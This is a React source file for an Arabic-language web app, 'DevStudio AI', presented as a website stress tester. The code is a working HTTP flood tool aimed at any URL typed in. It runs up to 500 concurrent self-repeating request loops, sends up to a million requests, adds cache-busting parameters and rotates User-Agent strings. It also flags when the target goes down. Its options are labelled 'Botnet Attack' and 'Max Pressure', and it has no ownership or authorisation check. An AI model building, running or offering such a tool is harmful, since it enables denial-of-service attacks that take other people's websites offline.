'use client';

import { useState, useRef } from 'react';
import { 
  MessageSquare, 
  Globe, 
  Play, 
  Square, 
  Cpu, 
  Zap, 
  Activity, 
  ShieldAlert, 
  Terminal,
  AlertTriangle,
  CheckCircle2
} from 'lucide-react';

export default function App() {
  const [activeTab, setActiveTab] = useState('browser');

  const [chatMessages, setChatMessages] = useState([
    { role: 'assistant', content: 'مرحباً بك! يمكنك إدخال رابط الموقع وتحديد الكثافة لبدء اختبار الضغط المباشر.' }
  ]);
  const [chatInput, setChatInput] = useState('');

  const [urlInput, setUrlInput] = useState('https://studioai.up.railway.app/');
  const [currentUrl, setCurrentUrl] = useState('https://studioai.up.railway.app/');

  const [agentType, setAgentType] = useState('mobile'); 
  const [totalAgents, setTotalAgents] = useState(1000000); 
  const [concurrencyBatch, setConcurrencyBatch] = useState(300); 
  
  const [isRunningTest, setIsRunningTest] = useState(false);
  const [sentRequests, setSentRequests] = useState(0);
  const [latencyMs, setLatencyMs] = useState(0);
  const [errorCount, setErrorCount] = useState(0);
  const [successCount, setSuccessCount] = useState(0);
  const [requestsPerSec, setRequestsPerSec] = useState(0);
  const [serverStatus, setServerStatus] = useState('online'); // 'online' | 'down' | 'testing'
  const [logs, setLogs] = useState([]);

  const isTestingRef = useRef(false);
  const requestsCounterRef = useRef(0);
  const consecutiveErrorsRef = useRef(0);
  const rpsTimerRef = useRef(null);

  const addLog = (msg) => {
    setLogs((prev) => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 49)]);
  };

  const runStressWorker = async (targetUrl) => {
    if (!isTestingRef.current) return;

    const userAgents = [
      'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
      'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    ];

    const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 4000); // 4 sec timeout

    const startTime = performance.now();
    // Cache buster parameter to bypass caching and hit server directly
    const cacheBusterUrl = targetUrl.includes('?') 
      ? `${targetUrl}&_ts=${Date.now()}_${Math.random()}`
      : `${targetUrl}?_ts=${Date.now()}_${Math.random()}`;

    try {
      await fetch(cacheBusterUrl, {
        method: 'GET',
        mode: 'no-cors',
        cache: 'no-store',
        signal: controller.signal,
        headers: { 'User-Agent': randomUA }
      });

      clearTimeout(timeoutId);
      const duration = Math.round(performance.now() - startTime);
      setLatencyMs(duration);
      setSuccessCount((prev) => prev + 1);
      consecutiveErrorsRef.current = 0;

    } catch (err) {
      clearTimeout(timeoutId);
      setErrorCount((prev) => prev + 1);
      consecutiveErrorsRef.current += 1;

      // Detect server crash if consecutive errors spike heavily
      if (consecutiveErrorsRef.current > 50 && serverStatus !== 'down') {
        setServerStatus('down');
        addLog(`⚠️ تحذير: السيرفر لا يستجيب أو انهدم تحت الضغط! (Target Down)`);
      }
    } finally {
      setSentRequests((prev) => {
        const next = prev + 1;
        requestsCounterRef.current += 1;
        
        if (next >= totalAgents) {
          stopTest();
          addLog(`اكتمل الاختبار! الموقع تحمل إرسال ${totalAgents.toLocaleString()} طلب.`);
        }
        return next;
      });

      if (isTestingRef.current) {
        // Immediate recursion to maximize load rate
        Promise.resolve().then(() => runStressWorker(targetUrl));
      }
    }
  };

  const startTest = () => {
    if (!currentUrl) return;
    
    setIsRunningTest(true);
    isTestingRef.current = true;
    setSentRequests(0);
    setErrorCount(0);
    setSuccessCount(0);
    setServerStatus('testing');
    consecutiveErrorsRef.current = 0;
    requestsCounterRef.current = 0;

    addLog(`🚀 بدء إغراق الطلبات المكثف على: ${currentUrl}`);

    rpsTimerRef.current = setInterval(() => {
      setRequestsPerSec(requestsCounterRef.current);
      requestsCounterRef.current = 0;
    }, 1000);

    // Launch threads concurrently
    for (let i = 0; i < concurrencyBatch; i++) {
      runStressWorker(currentUrl);
    }
  };

  const stopTest = () => {
    setIsRunningTest(false);
    isTestingRef.current = false;
    if (rpsTimerRef.current) clearInterval(rpsTimerRef.current);
    addLog('تم إيقاف اختبار الضغط.');
  };

  const toggleTest = () => {
    if (isRunningTest) {
      stopTest();
    } else {
      startTest();
    }
  };

  const handleUrlSubmit = (e) => {
    e?.preventDefault();
    if (!urlInput.trim()) return;

    let target = urlInput.trim();
    if (!target.startsWith('http://') && !target.startsWith('https://')) {
      target = 'https://' + target;
    }
    setCurrentUrl(target);
    setServerStatus('online');
    addLog(`تم اعتماد الرابط الهدف: ${target}`);
  };

  const handleSendMessage = () => {
    if (!chatInput.trim()) return;
    setChatMessages((prev) => [...prev, { role: 'user', content: chatInput }]);
    setChatInput('');
    setTimeout(() => {
      setChatMessages((prev) => [
        ...prev,
        { role: 'assistant', content: 'تم استلام استفسارك بنجاح.' }
      ]);
    }, 500);
  };

  return (
    <div className="flex flex-col md:flex-row h-screen w-screen overflow-hidden bg-slate-950 text-slate-100">
      
      {/* Sidebar */}
      <aside className="w-full md:w-64 bg-slate-900 border-b md:border-b-0 md:border-r border-slate-800 flex md:flex-col justify-between shrink-0 p-3">
        <div className="flex md:flex-col items-center md:items-stretch w-full justify-between gap-2">
          <div className="flex items-center gap-2 p-1 font-bold text-base md:text-lg">
            <Cpu className="text-blue-500 w-5 h-5 shrink-0" />
            <span>DevStudio AI</span>
          </div>

          <div className="flex md:flex-col gap-1">
            <button
              onClick={() => setActiveTab('browser')}
              className={`flex items-center gap-2 px-3 py-2 rounded-lg text-xs md:text-sm font-medium transition ${
                activeTab === 'browser' ? 'bg-blue-600 text-white' : 'text-slate-400 hover:bg-slate-800'
              }`}
            >
              <Globe className="w-4 h-4" />
              <span>المتصفح والأدوات</span>
            </button>

            <button
              onClick={() => setActiveTab('chat')}
              className={`flex items-center gap-2 px-3 py-2 rounded-lg text-xs md:text-sm font-medium transition ${
                activeTab === 'chat' ? 'bg-blue-600 text-white' : 'text-slate-400 hover:bg-slate-800'
              }`}
            >
              <MessageSquare className="w-4 h-4" />
              <span>الدردشة</span>
            </button>
          </div>
        </div>
      </aside>

      {/* Main Workspace */}
      <main className="flex-1 flex flex-col h-full overflow-hidden">
        
        {activeTab === 'browser' && (
          <div className="flex-1 flex flex-col h-full overflow-y-auto md:overflow-hidden">
            
            {/* Server Status Indicator Banner */}
            {serverStatus === 'down' && (
              <div className="bg-rose-600 text-white px-4 py-2 text-xs font-bold flex items-center justify-between animate-pulse">
                <span className="flex items-center gap-2">
                  <AlertTriangle className="w-4 h-4" />
                  الموقع لا يستجيب حالياً أو سقط بسبب كثافة الضغط (Target Unresponsive / Down)
                </span>
                <button onClick={() => setServerStatus('testing')} className="underline text-[10px]">تجاهل</button>
              </div>
            )}

            {/* Control Bar */}
            <header className="bg-slate-900 border-b border-slate-800 p-3 flex flex-col lg:flex-row gap-3 items-stretch lg:items-center justify-between shrink-0">
              
              <form onSubmit={handleUrlSubmit} className="flex-1 flex items-center gap-2 bg-slate-950 border border-slate-700 rounded-lg px-3 py-1.5">
                <Globe className="w-4 h-4 text-slate-500 shrink-0" />
                <input
                  type="text"
                  value={urlInput}
                  onChange={(e) => setUrlInput(e.target.value)}
                  placeholder="ضع رابط الموقع المستهدف..."
                  className="bg-transparent border-none text-xs md:text-sm w-full focus:outline-none text-slate-200"
                />
                <button type="submit" className="text-xs bg-slate-800 hover:bg-slate-700 px-3 py-1 rounded">
                  دخول
                </button>
              </form>

              <div className="flex flex-wrap items-center gap-2">
                <select
                  value={agentType}
                  onChange={(e) => setAgentType(e.target.value)}
                  className="bg-slate-950 border border-slate-700 text-slate-200 text-xs rounded-lg px-2 py-1.5 focus:outline-none"
                >
                  <option value="mobile">Mobile Flood</option>
                  <option value="ai-agent">Botnet Attack</option>
                </select>

                <select
                  value={totalAgents}
                  onChange={(e) => setTotalAgents(Number(e.target.value))}
                  className="bg-slate-950 border border-slate-700 text-slate-200 text-xs rounded-lg px-2 py-1.5 focus:outline-none"
                >
                  <option value={10000}>10,000 req</option>
                  <option value={100000}>100,000 req</option>
                  <option value={1000000}>1,000,000 req</option>
                </select>

                <select
                  value={concurrencyBatch}
                  onChange={(e) => setConcurrencyBatch(Number(e.target.value))}
                  className="bg-slate-950 border border-slate-700 text-slate-200 text-xs rounded-lg px-2 py-1.5 focus:outline-none"
                >
                  <option value={100}>100 Concurrency</option>
                  <option value={300}>300 Ultra Blast</option>
                  <option value={500}>500 Max Pressure</option>
                </select>

                <button
                  onClick={toggleTest}
                  className={`flex items-center justify-center gap-1.5 px-4 py-1.5 rounded-lg text-xs font-semibold transition ${
                    isRunningTest ? 'bg-red-600 hover:bg-red-500 text-white' : 'bg-emerald-600 hover:bg-emerald-500 text-white'
                  }`}
                >
                  {isRunningTest ? <><Square className="w-3.5 h-3.5" /> إيقاف الضغط</> : <><Play className="w-3.5 h-3.5" /> بدء الضغط</>}
                </button>
              </div>
            </header>

            {/* Metrics Status Bar */}
            <div className="bg-slate-900/60 border-b border-slate-800 p-2 grid grid-cols-2 sm:grid-cols-4 gap-2 text-xs shrink-0">
              <div className="flex items-center gap-2 bg-slate-950 p-2 rounded border border-slate-800">
                <Zap className="w-4 h-4 text-amber-400 shrink-0" />
                <div className="overflow-hidden">
                  <div className="text-slate-500 text-[10px]">الطلبات المنسكبة</div>
                  <div className="font-mono font-bold truncate">{sentRequests.toLocaleString()}</div>
                </div>
              </div>

              <div className="flex items-center gap-2 bg-slate-950 p-2 rounded border border-slate-800">
                <Activity className="w-4 h-4 text-blue-400 shrink-0" />
                <div className="overflow-hidden">
                  <div className="text-slate-500 text-[10px]">السرعة (RPS)</div>
                  <div className="font-mono font-bold text-blue-400 truncate">{requestsPerSec} req/s</div>
                </div>
              </div>

              <div className="flex items-center gap-2 bg-slate-950 p-2 rounded border border-slate-800">
                <Cpu className="w-4 h-4 text-emerald-400 shrink-0" />
                <div className="overflow-hidden">
                  <div className="text-slate-500 text-[10px]">زمن الاستجابة</div>
                  <div className="font-mono font-bold truncate">{latencyMs} ms</div>
                </div>
              </div>

              <div className="flex items-center gap-2 bg-slate-950 p-2 rounded border border-slate-800">
                <ShieldAlert className="w-4 h-4 text-rose-400 shrink-0" />
                <div className="overflow-hidden">
                  <div className="text-slate-500 text-[10px]">فشل / أخطاء</div>
                  <div className="font-mono font-bold text-rose-400 truncate">{errorCount}</div>
                </div>
              </div>
            </div>

            {/* Workspace Area (Preview + Logs only) */}
            <div className="flex-1 grid grid-cols-1 lg:grid-cols-3 gap-0 overflow-hidden">
              
              {/* Target Preview Frame */}
              <div className="lg:col-span-2 border-b lg:border-b-0 lg:border-r border-slate-800 flex flex-col h-[55vh] lg:h-full">
                <div className="bg-slate-900 px-3 py-1 border-b border-slate-800 text-[11px] text-slate-400 flex justify-between items-center shrink-0">
                  <span>المعاينة المباشرة (Live Preview)</span>
                  <span className="truncate max-w-[200px] font-mono text-[10px] text-slate-500">{currentUrl}</span>
                </div>
                <div className="flex-1 bg-white relative">
                  <iframe
                    src={currentUrl}
                    className="w-full h-full border-none"
                    title="Target Live Preview"
                  />
                </div>
              </div>

              {/* Console Logs Panel */}
              <div className="lg:col-span-1 flex flex-col h-[35vh] lg:h-full bg-slate-950">
                <div className="bg-slate-900 px-3 py-1.5 border-b border-slate-800 text-[11px] text-slate-400 flex items-center justify-between shrink-0">
                  <span className="flex items-center gap-1.5">
                    <Terminal className="w-3.5 h-3.5 text-blue-400" /> Live Console Traffic
                  </span>
                  <span className="text-[10px] text-slate-500">{logs.length} events</span>
                </div>
                <div className="flex-1 p-2 overflow-y-auto font-mono text-[11px] text-slate-300 space-y-1 bg-slate-950">
                  {logs.length === 0 ? (
                    <div className="text-slate-600 italic p-2">اضغط على "بدء الضغط" لبث الطلبات مباشرة...</div>
                  ) : (
                    logs.map((log, index) => (
                      <div key={index} className="border-b border-slate-900 pb-1">
                        {log}
                      </div>
                    ))
                  )}
                </div>
              </div>

            </div>

          </div>
        )}

        {/* Chat Tab */}
        {activeTab === 'chat' && (
          <div className="flex-1 flex flex-col h-full bg-slate-950">
            <header className="bg-slate-900 border-b border-slate-800 p-3">
              <h2 className="text-xs font-semibold text-slate-300">الدردشة والتعليمات</h2>
            </header>

            <div className="flex-1 overflow-y-auto p-3 space-y-3">
              {chatMessages.map((msg, index) => (
                <div
                  key={index}
                  className={`flex ${msg.role === 'user' ? 'justify-end' : 'justify-start'}`}
                >
                  <div
                    className={`max-w-[85%] p-3 rounded-lg text-xs md:text-sm leading-relaxed ${
                      msg.role === 'user'
                        ? 'bg-blue-600 text-white'
                        : 'bg-slate-900 border border-slate-800 text-slate-200'
                    }`}
                  >
                    {msg.content}
                  </div>
                </div>
              ))}
            </div>

            <div className="p-3 border-t border-slate-800 bg-slate-900 flex gap-2">
              <input
                type="text"
                value={chatInput}
                onChange={(e) => setChatInput(e.target.value)}
                onKeyDown={(e) => e.key === 'Enter' && handleSendMessage()}
                placeholder="اكتب رسالتك..."
                className="flex-1 bg-slate-950 border border-slate-700 rounded-lg px-3 py-1.5 text-xs text-slate-200 focus:outline-none focus:border-blue-500"
              />
              <button
                onClick={handleSendMessage}
                className="bg-blue-600 hover:bg-blue-500 text-white px-4 py-1.5 rounded-lg text-xs font-medium transition"
              >
                إرسال
              </button>
            </div>
          </div>
        )}

      </main>
    </div>
  );
}
